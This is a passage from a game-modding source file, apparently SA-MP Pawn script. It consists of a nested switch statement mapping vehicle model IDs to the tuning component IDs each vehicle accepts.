				case 1000: { return 1; }
				case 1002: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1016: { return 1; }
				case 1017: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 405:
		{
			switch(componentid)
			{
				case 1000: { return 1; }
				case 1001: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1014: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 410:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1017: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1023: { return 1; }
				case 1024: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 415:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 418:
		{
			switch(componentid)
			{
				case 1002: { return 1; }
				case 1006: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1016: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 420:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1004: { return 1; }
				case 1005: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1019: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 421:
		{
			switch(componentid)
			{
				case 1000: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1014: { return 1; }
				case 1016: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 422:
		{
			switch(componentid)
			{
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1017: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 426:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1004: { return 1; }
				case 1005: { return 1; }
				case 1006: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1019: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 436:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1017: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1022: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 439:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1017: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 477:
		{
			switch(componentid)
			{
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 478:
		{
			switch(componentid)
			{
				case 1004: { return 1; }
				case 1005: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1012: { return 1; }
				case 1013: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1022: { return 1; }
				case 1024: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 489:
		{
			switch(componentid)
			{
				case 1000: { return 1; }
				case 1002: { return 1; }
				case 1004: { return 1; }
				case 1005: { return 1; }
				case 1006: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1016: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1024: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 491:
		{
			switch(componentid)
			{
				case 1003: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1014: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 492:
		{
			switch(componentid)
			{
				case 1000: { return 1; }
				case 1004: { return 1; }
				case 1005: { return 1; }
				case 1006: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1016: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 496:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1002: { return 1; }
				case 1003: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1011: { return 1; }
				case 1017: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
			}
		}
		case 500:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1024: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 516:
		{
			switch(componentid)
			{
				case 1000: { return 1; }
				case 1002: { return 1; }
				case 1004: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1015: { return 1; }
				case 1016: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 517:
		{
			switch(componentid)
			{
				case 1002: { return 1; }
				case 1003: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1016: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 518:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1005: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 527:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1014: { return 1; }
				case 1015: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 529:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1011: { return 1; }
				case 1012: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 534:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1100: { return 1; }
				case 1101: { return 1; }
				case 1106: { return 1; }
				case 1122: { return 1; }
				case 1123: { return 1; }
				case 1124: { return 1; }
				case 1125: { return 1; }
				case 1126: { return 1; }
				case 1127: { return 1; }
				case 1178: { return 1; }
				case 1179: { return 1; }
				case 1180: { return 1; }
				case 1185: { return 1; }
			}
		}
		case 535:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1109: { return 1; }
				case 1110: { return 1; }
				case 1113: { return 1; }
				case 1114: { return 1; }
				case 1115: { return 1; }
				case 1116: { return 1; }
				case 1117: { return 1; }
				case 1118: { return 1; }
				case 1119: { return 1; }
				case 1120: { return 1; }
				case 1121: { return 1; }
			}
		}
		case 536:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1103: { return 1; }
				case 1104: { return 1; }
				case 1105: { return 1; }
				case 1107: { return 1; }
				case 1108: { return 1; }
				case 1128: { return 1; }
				case 1181: { return 1; }
				case 1182: { return 1; }
				case 1183: { return 1; }
				case 1184: { return 1; }
			}
		}
		case 540:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1004: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1024: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 542:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1014: { return 1; }
				case 1015: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 546:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1002: { return 1; }
				case 1004: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1023: { return 1; }
				case 1024: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 547:
		{
			switch(componentid)
			{
				case 1000: { return 1; }
				case 1003: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1016: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
			}
		}
		case 549:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1011: { return 1; }
				case 1012: { return 1; }
				case 1017: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 550:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1004: { return 1; }
				case 1005: { return 1; }
				case 1006: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
				case 1145: { return 1; }
			}
		}
		case 551:
		{
			switch(componentid)
			{
				case 1002: { return 1; }
				case 1003: { return 1; }
				case 1005: { return 1; }
				case 1006: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1016: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1023: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 558:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1088: { return 1; }
				case 1089: { return 1; }
				case 1090: { return 1; }
				case 1091: { return 1; }
				case 1092: { return 1; }
				case 1093: { return 1; }
				case 1094: { return 1; }
				case 1095: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1163: { return 1; }
				case 1164: { return 1; }
				case 1165: { return 1; }
				case 1166: { return 1; }
				case 1167: { return 1; }
				case 1168: { return 1; }
			}
		}
		case 559:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1025: { return 1; }
				case 1065: { return 1; }
				case 1066: { return 1; }
				case 1067: { return 1; }
				case 1068: { return 1; }
				case 1069: { return 1; }
				case 1070: { return 1; }
				case 1071: { return 1; }
				case 1072: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1158: { return 1; }
				case 1159: { return 1; }
				case 1160: { return 1; }
				case 1161: { return 1; }
				case 1162: { return 1; }
				case 1173: { return 1; }
			}
